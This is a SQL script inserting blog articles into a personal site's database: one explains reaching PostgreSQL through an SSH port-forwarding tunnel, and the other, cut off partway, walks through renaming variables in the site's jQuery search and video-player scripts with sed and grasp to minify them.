\c themetacity;
SET ROLE com_admin;
INSERT INTO com.articles (id,title,url,blurb,variant,content,parent_id) VALUES
    ('0140eb0b-2980-7014-a8c9-7800b3aa2d62'::uuid,'Access PostgreSQL via SSH tunnel','access-postgresql-via-ssh-tunnel','How I access PostgreSQL when it only listens to the server it is running on.','blog'::com.variant,'1. Write article, workshop entry, change in schema etc
2. Write new entry SQL command around said article
3. Run the command using the local installation of psql
4. Identify and make changes
5. GOTO step 1 until all changes needed are done
6. SCP the file to the server
7. SSH to the server (probably already have open in another window)
8. Run the command using the server installation of psql
9. Go to the local installation of psgq and reset the db ready for the next article

Now if I discover that I need to make a change (spelling usually or not closing tags) on the server version, it is usually easier to `UPDATE` than `INSERT` new changes.

1. Make updates by manually adding the ''contenteditable'' attribute to the whole article; this shows what changes will look like in real time
2. Write changes to a new file
3. Write new entry SQL `UPDATE` command around said article the file to the server
4. SSH to the server (probably already have open in another window)
5. Run the command using the server installation of psql

Another option is to:

1. Make updates by manually adding the ''contenteditable'' attribute to the whole article
2. Write changes to a new file
3. Write new entry SQL `UPDATE` command around said article
4. SSH to the server (probably already have open in another window)
5. Connect to the psql install and then to the db `psql -U username dbname`
6. Run the command by copying the local file contents into the server window psql prompt

Either way, not very efficient. What is more efficient is being able to use an SSH connetion to transparently open a path the server psql that the local one can use with SSH protection around the whole thing. An SSH tunnel. The easiest way to do this is: ''`ssh -N -L 5555:localhost:5432 server`''.

Buuuut...couldn''t you just whitelist your ip adress on the server? What if you don''t have permission to do so, or you move around a lot or just don''t want any external interface to your database/whatever.

The trick to understanding these tunnels is to read from the outside in. Let''s do that now:

1. ''`ssh ... server`'' Connect to server
2. ''`-N`'' Don''t connect a command prompt: we don''t want to do anything directly
3. ''`-L 555:localhost:5432`'' This is the meat of the operation and is discussed below

The general idea is to use the established connection to transparently forward ports from one computer, computer through the ssh connection to the port on the other computer. It can get (much) more complicated than that but for our purposes today let''s leave it at that.

Specifically in our connection the following happens: forward any connection to port 5555 through the ssh tunnel to (and this is the trick) what is now (since we are now on the server) the (remote remember) severs version of localhost port 5432. Once you understand that, most tunnels make much more sense. That idea is so important I will say it again: that ''localhost'' is the remote connection''s version of localhost not the local version. Renaming might clear up any stragglers: ''`ssh -N -L 5555:remoteserversversionoflocalhost:5432 remoteserver`''

Check `man ssh` for better technical description as to what is happening.

In practice this is a great way to send commands to pg (5432 is the default port) on a server that does not allow remote connection directly to pg, but you do have SSH access to.

N.B. There is one more thing to watch out for, PostgreSQL specific: by default psql tries to connect over a Unix socket which tunneling (AFAIK) can''t handle. To get around this you need to tell psql to use a TCP connection by adding in the ''`-h localhost`'' flag which defaults to TCP connections. That `-h` is the `remoteserversversionoflocalhost` remember.

In action: ''`ssh -N -L 5555:localhost:5432 server`''. You will end up (after authenticating) with a terminal window that looks like it is waiting to return; it will not. You could run it in the background if you wanted to establish a more permanent, out of the way connection by ameding ''`-f`'' and ''`&`'' (''`ssh -f -N -L 5555:localhost:5432 server &`'')d. In another window send the command you want (or connect via pgAdmin3 etc): ''`psql -h localhost -U username -p 5555 < commandtorun.sql`''. If everything has gone well, your command will automagically just run like the machine was sitting next to you.',NULL),
	('014373fd-3290-7bf9-8b05-6dbceb5c510f'::uuid,'Lets make a terrible JS minifier: Part 1','lets-make-a-terrible-js-minifier-part-1','Part one of a fun little series on minifying some JavaScript','blog'::com.variant,'So let''s write a script to do some minifying for us.

First we need some JS to minify: lets use he files running on this site. For this example we will be looking at what we can do to make the files small and how we can combine them to reduce http requests.

The files in question can [be found on GitHub][ghTMC] as the ones on this site have already been minified and so are incomprehensible.

The general approach we are taking today: reducing variable and function names to the smallest possible size (saves on bandwidth, and the interpretor doesn''t care anyway), remove all extraneous formatting (the JS processor does not care about readability) and mash all the files together (saves on https requests).

The order we do these operations to the file can be important, and I will point out where you should look if something were to come up. The first pass I am going to take on the files is a pretty naive one but gets the job done (somewhat) and then we will move on to something a bit more appropriate.

The first file in question is the one that drives the search [on the workshop page (searcher.js)][ghSearcher.js].

```{}javascript
$(document).ready(function () {
    "use strict";
    var $noResults, $searchBox, $entries, searchTimeout, firstRun, loc, hist, win;
    $noResults = $(''#noresults'');
    $searchBox = $(''#searchinput'');
    $entries = $(''#workshopBlurbEntries'');
    searchTimeout = null;
    firstRun = true;
    loc = location;
    hist = history;
    win = window;

    function reset() {
        if (hist.state !== undefined) {  // Avoid infinite loops
            hist.pushState({"tag": undefined}, "theMetaCity - Workshop", "/workshop/");
        }
        $noResults.hide();
        $entries.fadeOut(150, function () {
            $(''header ul li'', this).removeClass(''searchMatchTag'');
            $(''header h1 a span'', this).removeClass(''searchMatchTitle'');  // The span remains but it is destroyed when filtering using the text() function
            $(".workshopentry", this).show();
        });
        $entries.fadeIn(150);
    }

    function filter(searchTerm) {
        if (searchTerm === undefined) {  // Only history api should push undefined to this, explicitly taken care of otherwise
            reset();
        } else {
            var rePattern = searchTerm.replace(/[.?*+^$\[\]\\(){}|]/g, "\\$&"), searchPattern = new RegExp(''('' + rePattern + '')'', ''ig'');  // The brackets add a capture group

            $entries.fadeOut(150, function () {
                $noResults.hide();

                $(''header'', this).each(function () {
                    $(this).parent().hide();

                    // Clear results of previous search
                    $(''li'', this).removeClass(''searchMatchTag'');

                    // Check the title
                    $(''h1'', this).each(function () {
                        var textToCheck = $(''a'', this).text();
                        if (textToCheck.match(searchPattern)) {
                            textToCheck = textToCheck.replace(searchPattern, ''<span class="searchMatchTitle">$1</span>'');  //capture group ($1) used so that the replacement matches the case and you don''t get weird capitolisations
                            $(''a'', this).html(textToCheck);
                            $(this).closest(''.workshopentry'').show();
                        } else {
                            $(''a'', this).html(textToCheck);
                        }
                    });

                    // Check the tags
                    $(''li'', this).each(function () {
                        if ($(this).text().match(searchPattern)) {
                            $(this).addClass(''searchMatchTag'');
                            $(this).closest(''.workshopentry'').show();
                        }
                    });
                });

                if ($(''.workshopentry[style*="block"]'').length === 0) {
                    $noResults.show();
                }

                $entries.fadeIn(150);
            });
        }
    }

    $(''header ul li a'', $entries).on(''click'', function () {
        hist.pushState({"tag": $(this).text()}, "theMetaCity - Workshop - " + $(this).text(), "/workshop/tag/" + $(this).text());
        $searchBox.val('''');
        filter($(this).text());
        return false;  // Using the history API so no page reloads/changes
    });

    $searchBox.on(''keyup'', function () {
        clearTimeout(searchTimeout);
        if ($(this).val().length) {
            searchTimeout = setTimeout(function () {
                var searchVal = $searchBox.val();
                hist.pushState({"tag": searchVal}, "theMetaCity - Workshop - " + searchVal, "/workshop/tag/" + searchVal);
                filter(searchVal);
            }, 500);
        }

        if ($(this).val().length === 0) {
            searchTimeout = setTimeout(function () {
                reset();
            }, 500);
        }
    });

    $(''#reset'').on(''click'', function () {
        $searchBox.val('''');
        reset();
    });

    win.addEventListener("popstate", function (event) {
        console.info(hist.state);
        if (event.state === null) { // Start of history chain on this page, direct entry to page handled by firstRun)
            reset();
        } else {
            if (event.state.tag !== undefined) {
                $searchBox.val(event.state.tag);
                filter(event.state.tag);
            }
        }
    });

    $noResults.hide();

    if (firstRun) {                               // 0     1     2        3      4 (if / present)
        var locArray = loc.pathname.split(''/'');   // ''/workshop/tag/searchString/
        if (locArray[2] === ''tag'' && locArray[3] !== undefined) {    // Check for direct link to tag (i.e. if something in [3] search for it)
            hist.pushState({"tag": locArray[3]}, "theMetaCity - Workshop - " + locArray[3], "/workshop/tag/" + locArray[3]);
            filter(locArray[3]);
        } else if (locArray[2] === '''') {   // Root page and really shouldn''t do anything
            //hist.pushState({"tag": undefined}, "theMetaCity - Workshop", "/workshop/");
        }   // locArray[2] === somepagenum is an actual page and what should be allowed to happen by itself

        firstRun = false;
        // Save state on first page load
    }
});
```

As you can see, a horrible mix of jQuery and vanilla JS and terrible clunky junk with plenty of bugs. So let''s start stripping out things we do not need. First up is the variable and function names which can be shortened to individual letters to save on bytes during transmission.

```
:::bash
#  Minify the variable names.
#  Each script is put in its own function scope so other scripts should (in theory) have no problems with this
cat searcher.js > temp
sed -i ''s/$noResults\b/z/g'' temp
sed -i ''s/$searchBox\b/y/g'' temp
sed -i ''s/$entries\b/x/g'' temp
sed -i ''s/searchTimeout\b/w/g'' temp
sed -i ''s/firstRun\b/v/g'' temp
sed -i ''s/loc\b/u/g'' temp
sed -i ''s/hist\b/t/g'' temp
sed -i ''s/win\b/s/g'' temp
sed -i ''s/textToCheck\b/r/g'' temp
sed -i ''s/searchPattern\b/q/g'' temp
sed -i ''s/address\b/p/g'' temp
sed -i ''s/searchString\b/o/g'' temp
sed -i ''s/searchTerm\b/n/g'' temp

# Function names
sed -i ''s/filter(/m(/g'' temp
sed -i ''s/reset(/l(/g'' temp

# Copy over ready for the next stage of processing
cat temp > tmcscripts.js
```

The actual process is pretty straight forward: edit in place (`-i`) the file (in temp for reasons explained later) searching and replacing each instance of the variable and function names. Started at `z` and worked backwards to try to avoid collisions with `i` and other counters (although there are none in this file). Although this works pretty well it is still kind of naive and prone to error. What happens if there is a string and variable string the same name, or get the regex just slightly wrong? A much better solution is to use an abstract syntax tree to parse the file and replace symbols that way. One such exists: [tool for this is graspjs.com][grasp].

```
:::bash
#  Minify the variable names.
#  Each script is put in its own function scope so other scripts should (in theory) have no problems with this
cat searcher.js > temp.js
grasp -i ''#$noResults'' -R z temp.js
grasp -i ''#$searchBox'' -R y temp.js
grasp -i ''#$entries'' -R x temp.js
grasp -i ''#searchTimeout'' -R w temp.js
grasp -i ''#firstRun'' -R v temp.js
grasp -i ''#loc'' -R u temp.js
grasp -i ''#hist'' -R t temp.js
grasp -i ''#win'' -R s temp.js
grasp -i ''#searchTerm'' -R r temp.js
grasp -i ''#rePattern'' -R q temp.js
grasp -i ''#searchPattern'' -R p temp.js
grasp -i ''#textToCheck'' -R o temp.js
sed -i ''s/searchVal\b/n/g'' temp.js  # current bug with grasp where it cant parse 3 or more variables on the same line

# Function names
grasp -i ''#filter'' -R m temp.js
grasp -i ''#reset'' -R l temp.js

cat temp.js > tmcscripts.js
rm temp.js
```

Which gives us:

```
:::javscript
$(document).ready(function () {
    "use strict";
    var z, y, x, w, v, u, t, s;
    z = $(''#noresults'');
    y = $(''#searchinput'');
    x = $(''#workshopBlurbEntries'');
    w = null;
    v = true;
    u = location;
    t = history;
    s = window;

    function k() {
        if (t.state !== undefined) {  // Avoid infinite loops
            t.pushState({"tag": undefined}, "theMetaCity - Workshop", "/workshop/");
        }
        z.hide();
        x.fadeOut(150, function () {
            $(''header ul li'', this).removeClass(''searchMatchTag'');
            $(''header h1 a span'', this).removeClass(''searchMatchTitle'');  // The span remains but it is destroyed when filtering using the text() function
            $(".workshopentry", this).show();
        });
        x.fadeIn(150);
    }

    function l(r) {
        if (r === undefined) {  // Only history api should push undefined to this, explicitly taken care of otherwise
            k();
        } else {
            var q = r.replace(/[.?*+^$\[\]\\(){}|]/g, "\\$&"), p = new RegExp(''('' + q + '')'', ''ig'');  // The brackets add a capture group

            x.fadeOut(150, function () {
                z.hide();

                $(''header'', this).each(function () {
                    $(this).parent().hide();

                    // Clear results of previous search
                    $(''li'', this).removeClass(''searchMatchTag'');

                    // Check the title
                    $(''h1'', this).each(function () {
                        var o = $(''a'', this).text();
                        if (o.match(p)) {
                            o = o.replace(p, ''<span class="searchMatchTitle">$1</span>'');  //capture group ($1) used so that the replacement matches the case and you don''t get weird capitolisations
                            $(''a'', this).html(o);
                            $(this).closest(''.workshopentry'').show();
                        } else {
                            $(''a'', this).html(o);
                        }
                    });

                    // Check the tags
                    $(''li'', this).each(function () {
                        if ($(this).text().match(p)) {
                            $(this).addClass(''searchMatchTag'');
                            $(this).closest(''.workshopentry'').show();
                        }
                    });
                });

                if ($(''.workshopentry[style*="block"]'').length === 0) {
                    z.show();
                }

                x.fadeIn(150);
            });
        }
    }

    $(''header ul li a'', x).on(''click'', function () {
        t.pushState({"tag": $(this).text()}, "theMetaCity - Workshop - " + $(this).text(), "/workshop/tag/" + $(this).text());
        y.val('''');
        l($(this).text());
        return false;  // Using the history API so no page reloads/changes
    });

    y.on(''keyup'', function () {
        clearTimeout(w);
        if ($(this).val().length) {
            w = setTimeout(function () {
                var n = y.val();
                t.pushState({"tag": n}, "theMetaCity - Workshop - " + n, "/workshop/tag/" + n);
                l(n);
            }, 500);
        }

        if ($(this).val().length === 0) {
            w = setTimeout(function () {
                k();
            }, 500);
        }
    });

    $(''#reset'').on(''click'', function () {
        y.val('''');
        k();
    });

    s.addEventListener("popstate", function (event) {
        console.info(t.state);
        if (event.state === null) { // Start of history chain on this page, direct entry to page handled by firstRun)
            k();
        } else {
            if (event.state.tag !== undefined) {
                y.val(event.state.tag);
                l(event.state.tag);
            }
        }
    });

    z.hide();

    if (v) {                               // 0     1     2        3      4 (if / present)
        var locArray = u.pathname.split(''/'');   // ''/workshop/tag/searchString/
        if (locArray[2] === ''tag'' && locArray[3] !== undefined) {    // Check for direct link to tag (i.e. if something in [3] search for it)
            t.pushState({"tag": locArray[3]}, "theMetaCity - Workshop - " + locArray[3], "/workshop/tag/" + locArray[3]);
            l(locArray[3]);
        } else if (locArray[2] === '''') {   // Root page and really shouldn''t do anything
            //hist.pushState({"tag": undefined}, "theMetaCity - Workshop", "/workshop/");
        }   // locArray[2] === somepagenum is an actual page and what should be allowed to happen by itself

        v = false;
        // Save state on first page load
    }
});
```

Pretty straightforward to use here and not much difference in logic compared to sed: find a variable/function replace it with a short name. One note you have seen is that it is still pretty new (2 months at the time of writing this) and there are some bugs in there which are easily managed. This is a pretty trivial use with nothing too complex to confuse things. Let''s look at a better use: video.js

```
:::javascript
$(document).ready(function () {
    "use strict";
    var videos = $("video"), doc = document, fsElement;

    Number.prototype.leftZeroPad = function (numZeros) {
        var n = Math.abs(this),
            zeros = Math.max(0, numZeros - Math.floor(n).toString().length),
            zeroString = Math.pow(10, zeros).toString().substr(1);
        if (this < 0) {
            zeroString = ''-'' + zeroString;
        }
        return zeroString + n;
    };

    function isVideoPlaying(video) {
        return !(video.paused || video.ended || video.seeking || video.readyState < video.HAVE_FUTURE_DATA);
    }

    // Pass in object of the video to play/pause and the control box associated with it
    function playPause(video) {
        var playPauseButton = $(".playPauseButton", video.parent)[0];
        if (isVideoPlaying(video)) {
            video.pause();
            playPauseButton.src = "/media/site-images/videoicons/smallplay.svg";
        } else {
            video.play();
            playPauseButton.src = "/media/site-images/videoicons/smallpause.svg";
        }
    }

    function rawTimeToFormattedTime(rawTime) {
        var chomped, seconds, minutes;
        chomped = Math.floor(rawTime);
        seconds = chomped % 60;
        minutes = Math.floor(chomped / 60);
        return minutes.leftZeroPad(2) + ":" + seconds.leftZeroPad(2);
    }

    $(videos).each(function () {
        var video = this, $videoContainer, $controlsBox, $playPauseButton, $progressBar, $startPoster, startPoster, $endPoster, customEndPoster, errorPoster, $currentTimeSpan, $durationTimeSpan;

        if (this.controls) {
            this.controls = false;
        }

        $(video).on("timeupdate",function () {
            $progressBar[0].value = (video.currentTime / video.duration) * 1000;
            $currentTimeSpan.text(rawTimeToFormattedTime(video.currentTime));

        }).on("loadedmetadata",function () {
                var canPlayVid = false;
                $("source", $(video)).each(function () {
                    if (video.canPlayType($(this).attr("type"))) {
                        canPlayVid = true;
                    }
                });
                if (!canPlayVid) {
                    errorPoster = "/media/site-images/movieerror.svg";
                    $.get(errorPoster, function (svg) {
                        errorPoster = doc.importNode(svg.documentElement, true);

                        $(errorPoster).attr("class", "poster errorposter");
                        $(errorPoster).attr("height", $(video).height());
                        $(errorPoster).attr("width", $(video).width());

                        $("source", $(video)).each(function () {
                            var newText = doc.createElementNS("http://www.w3.org/2000/svg", "tspan");
                            var link = doc.createElementNS("http://www.w3.org/2000/svg", "a");
                            newText.setAttributeNS(null, "x", "50%");
                            newText.setAttributeNS(null, "dy", "1.2em");
                            link.setAttributeNS("http://www.w3.org/1999/xlink", "href", this.src);
                            link.appendChild(doc.createTextNode(this.src));
                            newText.appendChild(link);

                            $("#sorrytext", errorPoster).append(newText);
                        });

                        $videoContainer.append(errorPoster);
                        $($videoContainer).trigger("reposition");
                    });
                } else {
                    $($currentTimeSpan).text(rawTimeToFormattedTime(this.currentTime));
                    $($durationTimeSpan).text(rawTimeToFormattedTime(this.duration));
                }

            }).on("click",function () {
                playPause(video);
            }).on("ended",function () {
                $controlsBox.css({''opacity'': 0});

                // Poster to show at end of movie
                if (video.dataset.endposter) {
                    customEndPoster = video.dataset.endposter;
                } else {
                    customEndPoster = "/media/site-images/endofmovie.svg";  // If none supplied, use our own, generic one
                }
                // Get the poster and make it inline
                // File is SVG so usual jQuery rules may not apply
                // File needs to have at least one element with "playButton" as class
                $.get(customEndPoster, function (svg) {
                    $endPoster = doc.importNode(svg.documentElement, true);
                    $endPoster = $($endPoster);

                    $endPoster.attr("class", "poster endposter");
                    $endPoster.attr("height", $(video).height());
                    $endPoster.attr("width", $(video).width());

                    $("#playButton", $endPoster).on("click", function () {
                        playPause(video);
                        $endPoster.remove(); // done with poster forever
                    });
                    $videoContainer.append($endPoster);
                    $($videoContainer).trigger("reposition");
                });
            }).on("play", function () {

            });

        // Setup the div container for the video, controls and poster
        $videoContainer = $(video).wrap(
            $(''<div></div>'', {
                class: ''videoContainer''
            }).on("mouseenter",function () {
                    $endPoster = $(".endposter", this); // This is NOT added to the whole script scope so have to rescope it here
                    errorPoster = $(".errorposter", this); // This is NOT added to the whole script scope so have to rescope it here
                    //   Not played yet              Finished playing              Cant play format
                    if ($startPoster.parent().length || $endPoster.parent().length || errorPoster.parent().length) {
                        $controlsBox.css({''opacity'': 0});
                    } else {
                        $controlsBox.fadeTo(400, 1);
                        $controlsBox.clearQueue();
                    }
                }).on("mouseleave",function () {
                    $controlsBox.fadeTo(400, 0);
                    $controlsBox.clearQueue();
                }).on("reposition", function () {
                    // Move posters and controls back into position after video position updated
                    var videoContainerOffset = $videoContainer.offset(),
                        videoContainerWidth = $videoContainer.width(),
                        heightsTogether = Math.floor(videoContainerOffset.top + $videoContainer.height() - $controlsBox.height()),
                        $endPoster = $(".endposter", this),
                        $errorPoster = $(".errorposter", this);

                    $($startPoster, this).offset({top: videoContainerOffset.top, left: videoContainerOffset.left});

                    $endPoster.offset({top: videoContainerOffset.top, left: videoContainerOffset.left});
                    $endPoster.attr("height", $(video).height());
                    $endPoster.attr("width", $(video).width());

                    $errorPoster.offset({top: videoContainerOffset.top, left: videoContainerOffset.left});

                    $controlsBox.offset({top: heightsTogether, left: videoContainerOffset.left});
                    $controlsBox.width(videoContainerWidth - 2); // 2 is for borders
                })
        ).parent(); // Return the newly created wrapper div (brand new parent of the video)

        $controlsBox = $("<div></div>", {
            class: "videoControls",
            css: {
                opacity: 0
            }
        }).appendTo($videoContainer);

        // Setup play/pause button
        $playPauseButton = $("<img />", {
            class: "playPauseButton",
            src: "/media/site-images/videoicons/smallplay.svg"
        }).on("click",function () {
                playPause(video);
            }).appendTo($controlsBox);

        $durationTimeSpan = $("<span></span>", {
            class: "timespan"
        }).appendTo($controlsBox);

        // Setup progress bar
        $progressBar = $("<input />", {
            type: "range",
            min: 0,
            max: 1000,
            value: 0
        }).on("change",function () {
                video.currentTime = video.duration * (this.value / 1000);
            }).on("mousedown",function () {
                video.pause();
            }).on("mouseup",function () {
                video.play();
            }).appendTo($controlsBox);

        $currentTimeSpan = $("<span></span>", {
            class: "timespan currenttimespan"
        }).appendTo($controlsBox);

        // Full screen
        $("<img />", {
            class: "fullscreenButton",
            src: "/media/site-images/videoicons/fullscreen.svg"
        }).on("click",function () {
                fsElement = video;
                if (video.requestFullScreen) {
                    video.requestFullScreen();
                } else if (video.webkitRequestFullScreen) {
                    video.webkitRequestFullScreen();
                } else if (video.mozRequestFullScreen) {
                    video.mozRequestFullScreen();
                }
            }).appendTo($controlsBox);

        // Posters to show before the user plays the video
        startPoster = this.dataset.startposter;
        if (!startPoster) {
            startPoster = "generic";  // If none supplied, use our own, generic one
        }
        // Get the poster and make it inline
        // File is SVG so usual jQuery rules may not apply
        // File needs to have at least one element with "playButton" as class
        $.get("https://assets.themetacity.com/video/" + startPoster + ".startposter.svg", function (svg) {
            $startPoster = doc.importNode(svg.documentElement, true);
            $startPoster = $($startPoster);

            $startPoster.attr("class", "poster");
            $startPoster.attr("height", $(video).height());
            $startPoster.attr("width", $(video).width());

            $("#playButton", $startPoster).on("click", function () {
                video.load();   // Initial data and metadata load events may have fired before they can be captured so manually fire them
                playPause(video);
                $startPoster.remove(); // done with poster forever
            });
            $videoContainer.append($startPoster);
            $($videoContainer).trigger("reposition");
        });

        // Add whe whole lot onto the page
        $videoContainer.append($controlsBox);

        $($videoContainer).trigger("reposition"); //Get its position right.
    });

    // Handle coming out of fullscreen
    $(doc).on("webkitfullscreenchange mozfullscreenchange fullscreenchange", function () {
        var isFullScreen = doc.fullScreen || doc.mozFullScreen || doc.webkitIsFullScreen;

        $(fsElement).each(function () {  // set to script scope as fullScreenElement appears to not work (yet?)
            var video = this, videoTime = video.currentTime;
            if (isFullScreen) {
                $("source", video).each(function () {
                    // .dataset.fullscreen is is treated a boolean, but it is just truthy string
                    // This function uses a standard format of names of full screen appropriate vids as shown below:
                    // original: originalvid.xyz            full screen: originalvid.fullscreen.xyz
                    // N.B. Can not have period (".") in original file same except for filetype
                    if (this.dataset.fullscreen) {
                        var splitSrc = this.src.split(".");
                        this.src = splitSrc[0] + "." + splitSrc[1] + "." + splitSrc[2] + ".fullscreen." + splitSrc[3];
                    }
                    video.load();
                });
            } else {  // Have left fullscreen and need to return to lower res video
                $("source", video).each(function () {
                    // Remove the full screen and go back to the original file
                    if (this.dataset.fullscreen) {
                        var splitSrc = this.src.split(".");
                        this.src = splitSrc[0] + "." + splitSrc[1] + "." + splitSrc[2] + "." + splitSrc[4];
                    } // Nothing was changed if data-fullscreen is false so no need to do anything

                    $(this).parent().load();  // The video
                    $(this).parent().trigger("reposition");  // The video container box
                });
            }
            $(video).on("loadedmetadata", function () {
                this.currentTime = videoTime;  // Skip to the time before we went full screen
                playPause(video);
            });
        });
    });
    $(window).on("resize", function () {
        $(videos).each(function () {
            $(this).parent().trigger("reposition");
        });
    });
});
```

A bit more complex and more involved. Set up with the usual sed treatment with one notable wrinkle.

```
:::bash
cat video.js > temp.js

sed -i ''s/videos\b/z/g'' temp.js
sed -i ''s/video\b/y/g'' temp.js
sed -i ''s/"y"/"video"/1'' temp.js  # Undo the first (and only) "video" instance
sed -i ''s/playPauseButton/x/g'' temp.js
sed -i ''s/vidIndex/w/g'' temp.js
...
```

The second sed line highlights the problem here as it can not differentiate between `video.blah()` and `var videos = $("video");`. This is pretty common (and is one of the use cases on the graspjs website). The sed solution to the sed problem is to go in again and turn back the variable: `sed -i ''s/"y"/"video"/1'' temp.js  # Undo the first (and only) "video" instance`. Not very wieldy.

Let''s do better:

```
:::bash
# Begin the smooshing of video.js
cat video.js > temp.js

grasp -i ''#videos'' -R z temp.js
grasp -i ''#leftZeroPad'' -R y temp.js
grasp -i ''#numZeros'' -R x temp.js
grasp -i ''#zeros'' -R w temp.js
grasp -i ''#zeroString'' -R v temp.js
grasp -i ''#isVideoPlaying'' -R u temp.js
grasp -i ''#video'' -R t temp.js
grasp -i ''#playPause'' -R s temp.js
grasp -i ''#vid'' -R r temp.js
grasp -i ''#playPauseButton'' -R q temp.js
grasp -i ''#rawTimeToFormattedTime'' -R p temp.js
grasp -i ''#rawTime'' -R o temp.js
grasp -i ''#chomped'' -R n temp.js
grasp -i ''#seconds'' -R m temp.js
grasp -i ''#minutes'' -R l temp.js
grasp -i ''#$video'' -R k temp.js
grasp -i ''#$videoContainer'' -R j temp.js
grasp -i ''#$controlsBox'' -R i temp.js
grasp -i ''#$playPauseButton'' -R h temp.js
grasp -i ''#$progressBar'' -R g temp.js
grasp -i ''#$poster'' -R f temp.js
grasp -i ''#customPoster'' -R e temp.js
grasp -i ''#$endPoster'' -R d temp.js
grasp -i ''#customEndPoster'' -R c temp.js
grasp -i ''#$errorPoster'' -R b temp.js
grasp -i ''#$currentTimeSpan'' -R a temp.js
grasp -i ''#$durationTimeSpan'' -R zz temp.js
grasp -i ''#svg'' -R zy temp.js
grasp -i ''#canPlayVid'' -R zx temp.js
grasp -i ''#newText'' -R zw temp.js
grasp -i ''#link'' -R zv temp.js
grasp -i ''#videoContainerOffset'' -R zu temp.js
grasp -i ''#videoContainerWidth'' -R zt temp.js
grasp -i ''#heightsTogether'' -R zs temp.js
grasp -i ''#doc'' -R zr temp.js
```

This works out to:

```
:::javascript
$(document).ready(function () {
    "use strict";
    var z = $("video"), zr = document, zq;

    Number.prototype.y = function (x) {
        var n = Math.abs(this),
            w = Math.max(0, x - Math.floor(n).toString().length),
            v = Math.pow(10, w).toString().substr(1);
        if (this < 0) {
            v = ''-'' + v;
        }
        return v + n;
    };

    function u(t) {
        return !(t.paused || t.ended || t.seeking || t.readyState < t.HAVE_FUTURE_DATA);
    }

    // Pass in object of the video to play/pause and the control box associated with it
    function s(t) {
        var q = $(".playPauseButton", t.parent)[0];
        if (u(t)) {
            t.pause();
            q.src = "/media/site-images/videoicons/smallplay.svg";
        } else {
            t.play();
            q.src = "/media/site-images/videoicons/smallpause.svg";
        }
    }

    function p(o) {
        var n, m, l;
        n = Math.floor(o);
        m = n % 60;
        l = Math.floor(n / 60);
        return l.y(2) + ":" + m.y(2);
    }

    $(z).each(function () {
        var t = this, j, i, h, g, $startPoster, startPoster, d, c, b, a, zz;

        if (this.controls) {
            this.controls = false;
        }

        $(t).on("timeupdate",function () {
            g[0].value = (t.currentTime / t.duration) * 1000;
            a.text(p(t.currentTime));

        }).on("loadedmetadata",function () {
                var zx = false;
                $("source", $(t)).each(function () {
                    if (t.canPlayType($(this).attr("type"))) {
                        zx = true;
                    }
                });
                if (!zx) {
                    b = "/media/site-images/movieerror.svg";
                    $.get(b, function (zy) {
                        b = zr.importNode(zy.documentElement, true);

                        $(b).attr("class", "poster errorposter");
                        $(b).attr("height", $(t).height());
                        $(b).attr("width", $(t).width());

                        $("source", $(t)).each(function () {
                            var zw = zr.createElementNS("http://www.w3.org/2000/svg", "tspan");
                            var zv = zr.createElementNS("http://www.w3.org/2000/svg", "a");
                            zw.setAttributeNS(null, "x", "50%");
                            zw.setAttributeNS(null, "dy", "1.2em");
                            zv.setAttributeNS("http://www.w3.org/1999/xlink", "href", this.src);
                            zv.appendChild(zr.createTextNode(this.src));
                            zw.appendChild(zv);

                            $("#sorrytext", b).append(zw);
                        });

                        j.append(b);
                        $(j).trigger("reposition");
                    });
                } else {
                    $(a).text(p(this.currentTime));
                    $(zz).text(p(this.duration));
                }

            }).on("click",function () {
                s(t);
            }).on("ended",function () {
                i.css({''opacity'': 0});

                // Poster to show at end of movie
                if (t.dataset.endposter) {
                    c = t.dataset.endposter;
                } else {
                    c = "/media/site-images/endofmovie.svg";  // If none supplied, use our own, generic one
                }
                // Get the poster and make it inline
                // File is SVG so usual jQuery rules may not apply
                // File needs to have at least one element with "playButton" as class
                $.get(c, function (zy) {
                    d = zr.importNode(zy.documentElement, true);
                    d = $(d);

                    d.attr("class", "poster endposter");
                    d.attr("height", $(t).height());
                    d.attr("width", $(t).width());

                    $("#playButton", d).on("click", function () {
                        s(t);
                        d.remove(); // done with poster forever
                    });
                    j.append(d);
                    $(j).trigger("reposition");
                });
            }).on("play", function () {

            });

        // Setup the div container for the video, controls and poster
        j = $(t).wrap(
            $(''<div></div>'', {
                class: ''videoContainer''
            }).on("mouseenter",function () {
                    d = $(".endposter", this); // This is NOT added to the whole script scope so have to rescope it here
                    b = $(".errorposter", this); // This is NOT added to the whole script scope so have to rescope it here
                    //   Not played yet              Finished playing              Cant play format
                    if ($startPoster.parent().length || d.parent().length || b.parent().length) {
                        i.css({''opacity'': 0});
                    } else {
                        i.fadeTo(400, 1);
                        i.clearQueue();
                    }
                }).on("mouseleave",function () {
                    i.fadeTo(400, 0);
                    i.clearQueue();
                }).on("reposition", function () {
                    // Move posters and controls back into position after video position updated
                    var zu = j.offset(),
                        zt = j.width(),
                        zs = Math.floor(zu.top + j.height() - i.height()),
                        d = $(".endposter", this),
                        $errorPoster = $(".errorposter", this);

                    $($startPoster, this).offset({top: zu.top, left: zu.left});

                    d.offset({top: zu.top, left: zu.left});
                    d.attr("height", $(t).height());
                    d.attr("width", $(t).width());

                    $errorPoster.offset({top: zu.top, left: zu.left});

                    i.offset({top: zs, left: zu.left});
                    i.width(zt - 2); // 2 is for borders
                })
        ).parent(); // Return the newly created wrapper div (brand new parent of the video)

        i = $("<div></div>", {
            class: "videoControls",
            css: {
                opacity: 0
            }
        }).appendTo(j);

        // Setup play/pause button
        h = $("<img />", {
            class: "playPauseButton",
            src: "/media/site-images/videoicons/smallplay.svg"
        }).on("click",function () {
                s(t);
            }).appendTo(i);

        zz = $("<span></span>", {
            class: "timespan"
        }).appendTo(i);

        // Setup progress bar
        g = $("<input />", {
            type: "range",
            min: 0,
            max: 1000,
            value: 0
        }).on("change",function () {
                t.currentTime = t.duration * (this.value / 1000);
            }).on("mousedown",function () {
                t.pause();
            }).on("mouseup",function () {
                t.play();
            }).appendTo(i);

        a = $("<span></span>", {
            class: "timespan currenttimespan"
        }).appendTo(i);

        // Full screen
        $("<img />", {
            class: "fullscreenButton",
            src: "/media/site-images/videoicons/fullscreen.svg"
        }).on("click",function () {
                zq = t;
                if (t.requestFullScreen) {
                    t.requestFullScreen();
                } else if (t.webkitRequestFullScreen) {
                    t.webkitRequestFullScreen();
                } else if (t.mozRequestFullScreen) {
                    t.mozRequestFullScreen();
                }
            }).appendTo(i);

        // Posters to show before the user plays the video
        startPoster = this.dataset.startposter;
        if (!startPoster) {
            startPoster = "generic";  // If none supplied, use our own, generic one
        }
        // Get the poster and make it inline
        // File is SVG so usual jQuery rules may not apply
        // File needs to have at least one element with "playButton" as class
